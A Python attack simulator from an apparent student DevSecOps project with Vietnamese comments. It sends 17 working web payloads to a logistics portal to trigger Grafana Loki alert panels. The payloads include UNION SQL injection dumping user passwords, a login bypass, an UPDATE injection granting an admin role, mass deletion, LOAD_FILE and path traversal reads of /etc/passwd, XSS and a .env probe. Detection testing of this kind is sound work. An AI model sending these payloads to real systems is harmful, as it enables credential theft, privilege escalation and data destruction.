# -*- coding: utf-8 -*-
"""
KỊCH BẢN THỰC NGHIỆM KIỂM THỬ AN NINH VÀ PHÁT THẢI TELEMETRY (SECURITY & TELEMETRY SIMULATOR)
Dự án: DevSecOps InlaneWeb Logistics Portal
Mục đích:
  - Tự động hóa gửi các kịch bản kiểm thử (14 kịch bản SQLi theo writeup + LFI/XSS/Probe)
    đến môi trường thực nghiệm InlaneWeb.
  - Tạo luồng lưu lượng nhật ký (Access Log & Error Log) có cấu trúc JSON qua STDOUT/STDERR.
  - Kích hoạt các bộ lọc cảnh báo LogQL trên Promtail & Grafana Loki Dashboard (8 Panels).
  - Thu thập số liệu và thời gian đáp ứng để đưa vào hồ sơ minh chứng Chương 4 của báo cáo.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from urllib.parse import quote, urljoin
import urllib.request
import urllib.error

# Kích hoạt bảng mã UTF-8 cho console
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8")

# Danh mục 14 kịch bản kiểm thử an ninh chuẩn hóa từ writeup.md + các lỗi mở rộng
TEST_SUITES = [
    {
        "id": "V1",
        "name": "In-band UNION-based SQLi (Ports search)",
        "method": "GET",
        "path": "/ports",
        "params": {"q": "cn' UNION SELECT 1, username, password, email FROM users-- -"},
        "data": None,
        "panel": "Panel 1: SQL Injection In-band Detections",
        "desc": "Thực nghiệm tiêm UNION SELECT trích xuất tài khoản người dùng tại ports.php"
    },
    {
        "id": "V2",
        "name": "In-band Error-based XPath SQLi (Port detail)",
        "method": "GET",
        "path": "/ports/CNSHA",
        "params": {"code": "CNSHA' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -"},
        "data": None,
        "panel": "Panel 2: Database Error & XPath Leak",
        "desc": "Thực nghiệm ép lỗi cú pháp XPath extractvalue để lộ tên CSDL"
    },
    {
        "id": "V3",
        "name": "Boolean-based SQLi Auth Bypass (Login form)",
        "method": "POST",
        "path": "/login",
        "params": {},
        "data": "username=admin%27--+-&password=dummy_password",
        "panel": "Panel 3: Authentication Anomalies & Bypass",
        "desc": "Thực nghiệm vượt qua xác thực bằng kỹ thuật ngắt chuỗi SQL admin'-- -"
    },
    {
        "id": "V4",
        "name": "Time-based Blind SQLi (Tracking API)",
        "method": "GET",
        "path": "/api/track",
        "params": {"tracking": "ILF1042CN' AND SLEEP(3)-- -"},
        "data": None,
        "panel": "Panel 4: High Latency & Time-based Blind SQLi",
        "desc": "Thực nghiệm suy diễn dữ liệu bằng độ trễ SLEEP(3) trên API tra cứu"
    },
    {
        "id": "V5",
        "name": "Order-By Clause Injection (Account shipments)",
        "method": "GET",
        "path": "/account",
        "params": {"order": "(CASE WHEN (1=1) THEN tracking_no ELSE id END)"},
        "data": None,
        "panel": "Panel 1: SQL Injection In-band Detections",
        "desc": "Thực nghiệm chèn biểu thức điều kiện vào mệnh đề ORDER BY"
    },
    {
        "id": "V6",
        "name": "UPDATE Statement Privilege Escalation",
        "method": "POST",
        "path": "/account/update",
        "params": {},
        "data": "email=test%40inlane.vn%27%2C+role%3D%27admin%27+WHERE+username%3D%27jsmith%27--+-",
        "panel": "Panel 3: Authentication Anomalies & Bypass",
        "desc": "Thực nghiệm tiêm câu lệnh UPDATE nâng quyền tài khoản người dùng"
    },
    {
        "id": "V7",
        "name": "Numeric SQL Injection (Shipment detail)",
        "method": "GET",
        "path": "/shipments/1",
        "params": {"id": "1 UNION SELECT 1, tracking_no, status, origin, destination FROM shipments-- -"},
        "data": None,
        "panel": "Panel 1: SQL Injection In-band Detections",
        "desc": "Thực nghiệm tiêm mã SQL trên tham số dạng số nguyên id"
    },
    {
        "id": "V8",
        "name": "INSERT Statement Error-based SQLi (Comments)",
        "method": "POST",
        "path": "/comments",
        "params": {},
        "data": "content=comment_test%27||(SELECT+extractvalue(1%2Cconcat(0x7e%2C(SELECT+version()))))||%27",
        "panel": "Panel 2: Database Error & XPath Leak",
        "desc": "Thực nghiệm tiêm chuỗi ép lỗi trong mệnh đề INSERT bình luận"
    },
    {
        "id": "V9",
        "name": "DELETE Statement Mass Removal SQLi",
        "method": "POST",
        "path": "/comments/del",
        "params": {},
        "data": "comment_id=0+OR+1%3D1",
        "panel": "Panel 6: Dangerous HTTP Operations & Mass Deletion",
        "desc": "Thực nghiệm tiêm điều kiện luôn đúng OR 1=1 trong câu lệnh xóa dữ liệu"
    },
    {
        "id": "V10",
        "name": "Admin Portal User Enumeration",
        "method": "GET",
        "path": "/admin",
        "params": {"search": "' UNION SELECT id, username, email, role FROM users-- -"},
        "data": None,
        "panel": "Panel 7: Admin Console Unauthorized Access",
        "desc": "Thực nghiệm dò quét bảng tài khoản khách hàng trên cổng quản trị"
    },
    {
        "id": "V11",
        "name": "Multi-Query CTAS Table Duplication",
        "method": "POST",
        "path": "/admin/export",
        "params": {},
        "data": "report_name=audit_leak+AS+SELECT+*+FROM+users--+-",
        "panel": "Panel 7: Admin Console Unauthorized Access",
        "desc": "Thực nghiệm lợi dụng CREATE TABLE sao chép toàn bộ bảng users"
    },
    {
        "id": "V12",
        "name": "Stacked Multi-Query Command (Console)",
        "method": "GET",
        "path": "/admin/console",
        "params": {"filter": "status FROM shipments; INSERT INTO audit_log(action) VALUES('simulated_attack')-- -"},
        "data": None,
        "panel": "Panel 8: Multi-Statement Stacked Queries Alert",
        "desc": "Thực nghiệm ghép đa lệnh ngăn cách bằng dấu chấm phẩy (;)"
    },
    {
        "id": "V13",
        "name": "Sensitive File Read Attempt (LOAD_FILE)",
        "method": "GET",
        "path": "/reports/down",
        "params": {"file": "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4-- -"},
        "data": None,
        "panel": "Panel 5: Local File Inclusion & Arbitrary Read",
        "desc": "Thực nghiệm đọc tệp nhạy cảm hệ điều hành qua hàm LOAD_FILE"
    },
    {
        "id": "V14",
        "name": "News Portal UNION Data Extraction",
        "method": "GET",
        "path": "/news",
        "params": {"id": "1' UNION SELECT 1, username, password, email FROM users-- -"},
        "data": None,
        "panel": "Panel 1: SQL Injection In-band Detections",
        "desc": "Thực nghiệm trích xuất tài khoản qua cổng tin tức công cộng"
    },
    {
        "id": "V15",
        "name": "Local File Inclusion Probe (Path Traversal)",
        "method": "GET",
        "path": "/index.php",
        "params": {"page": "../../../../etc/passwd"},
        "data": None,
        "panel": "Panel 5: Local File Inclusion & Arbitrary Read",
        "desc": "Thực nghiệm duyệt đường dẫn thư mục leo thang (Path Traversal)"
    },
    {
        "id": "V16",
        "name": "Reflected Cross-Site Scripting (XSS)",
        "method": "GET",
        "path": "/ports",
        "params": {"q": "<script>alert('DevSecOps-Verification')</script>"},
        "data": None,
        "panel": "Panel 6: XSS & Script Tag Injection",
        "desc": "Thực nghiệm chèn thẻ script kiểm tra bộ lọc mã độc phản xạ"
    },
    {
        "id": "V17",
        "name": "Sensitive Configuration File Probe",
        "method": "GET",
        "path": "/.env",
        "params": {},
        "data": None,
        "panel": "Panel 7: Reconnaissance & Environment File Probes",
        "desc": "Thực nghiệm dò quét tệp cấu hình chứa biến môi trường .env"
    }
]

def send_request(base_url: str, test_case: dict, timeout: int = 10) -> tuple[int, float, str]:
    path = test_case["path"]
    method = test_case["method"]
    params = test_case.get("params", {})
    data = test_case.get("data")
    
    url = urljoin(base_url, path)
    if params:
        query_string = "&".join(f"{quote(k)}={quote(str(v))}" for k, v in params.items())
        sep = "&" if "?" in url else "?"
        url = f"{url}{sep}{query_string}"
        
    headers = {
        "User-Agent": "Mozilla/5.0 (DevSecOps-Telemetry-Simulator/2.0)",
        "Accept": "text/html,application/json,*/*",
        "X-Simulated-By": "PTIT-DevSecOps-Team"
    }
    
    body_bytes = None
    if method == "POST":
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        if data:
            body_bytes = data.encode("utf-8")
            
    req = urllib.request.Request(url, data=body_bytes, headers=headers, method=method)
    
    start_time = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            elapsed = time.time() - start_time
            return resp.status, elapsed, "SUCCESS"
    except urllib.error.HTTPError as e:
        elapsed = time.time() - start_time
        return e.code, elapsed, f"HTTP_{e.code}"
    except urllib.error.URLError as e:
        elapsed = time.time() - start_time
        return 0, elapsed, f"CONN_ERR: {e.reason}"
    except Exception as e:
        elapsed = time.time() - start_time
        return 0, elapsed, f"ERR: {str(e)}"

def main():
    parser = argparse.ArgumentParser(description="DevSecOps Security & Telemetry Generator")
    parser.add_argument("--base-url", default="https://inlaneweb.ecotools.online",
                        help="Địa chỉ cổng InlaneWeb mục tiêu (mặc định: https://inlaneweb.ecotools.online)")
    parser.add_argument("--delay", type=float, default=1.5,
                        help="Thời gian giãn cách giữa các yêu cầu (giây) để quan sát Grafana (mặc định: 1.5s)")
    parser.add_argument("--cases", nargs="*", default=None,
                        help="Danh sách mã kịch bản cần chạy (ví dụ: V1 V2 V4 V12). Bỏ trống để chạy toàn bộ 17 kịch bản.")
    parser.add_argument("--repeat", type=int, default=1,
                        help="Số vòng lặp diễn tập để tạo xung nhịp (spike) trên biểu đồ (mặc định: 1)")
    
    args = parser.parse_args()
    base_url = args.base_url.rstrip("/")
    
    print("=" * 80)
    print(" HỆ THỐNG DIỄN TẬP THỰC NGHIỆM KIỂM THỬ AN NINH & PHÁT THẢI TELEMETRY")
    print(f" Cổng mục tiêu: {base_url}")
    print(f" Số kịch bản  : {len(TEST_SUITES)}")
    print(f" Độ trễ       : {args.delay} giây/yêu cầu | Lặp: {args.repeat} vòng")
    print(" Mở Grafana Dashboard (8 Panels) tại https://grafana.inlaneweb.io.vn để theo dõi.")
    print("=" * 80)
    print()
    
    selected_tests = TEST_SUITES
    if args.cases:
        selected_tests = [t for t in TEST_SUITES if t["id"] in args.cases]
        
    results = []
    total_count = len(selected_tests) * args.repeat
    current_idx = 0
    
    for round_num in range(1, args.repeat + 1):
        if args.repeat > 1:
            print(f"\n--- [VÒNG DIỄN TẬP {round_num}/{args.repeat}] ---")
            
        for t in selected_tests:
            current_idx += 1
            t_id = t["id"]
            name = t["name"]
            panel = t["panel"]
            
            print(f"[{current_idx:02d}/{total_count:02d}] Đang gửi kịch bản {t_id}: {name}...")
            print(f"       -> Phương thức: {t['method']} {t['path']}")
            print(f"       -> Mục tiêu Grafana: {panel}")
            
            status_code, latency, msg = send_request(base_url, t)
            
            status_str = f"Mã HTTP {status_code}" if status_code > 0 else msg
            print(f"       => Kết quả: {status_str} | Thời gian đáp ứng: {latency:.2f}s")
            
            results.append({
                "id": t_id,
                "name": name,
                "panel": panel,
                "status": status_code,
                "latency_sec": round(latency, 2),
                "desc": t["desc"]
            })
            
            time.sleep(args.delay)
            
    print("\n" + "=" * 80)
    print(" TỔNG KẾT DIỄN TẬP THỰC NGHIỆM & PHÁT THẢI TELEMETRY THÀNH CÔNG")
    print("=" * 80)
    print(f"{'Mã':<5} | {'Tên kịch bản':<36} | {'Mã HTTP':<8} | {'Độ trễ':<8} | {'Phân vùng Grafana tương ứng'}")
    print("-" * 80)
    for r in results:
        code_disp = str(r["status"]) if r["status"] > 0 else "ERR"
        print(f"{r['id']:<5} | {r['name'][:36]:<36} | {code_disp:<8} | {r['latency_sec']:<6}s | {r['panel']}")
        
    print("\n[HƯỚNG DẪN THU THẬP MINH CHỨNG CHO BÁO CÁO]:")
    print("1. Hãy truy cập Grafana Dashboard và chọn khung thời gian 'Last 15 minutes'.")
    print("2. Chụp ảnh 8 Panels hiển thị các đỉnh phát xạ (Spikes) và bảng Access Log tương ứng.")
    print("3. Lưu ảnh vào thư mục docs/images/ để đưa vào Mục 4.2 của báo cáo BTL.")
    print("=" * 80)

if __name__ == "__main__":
    main()

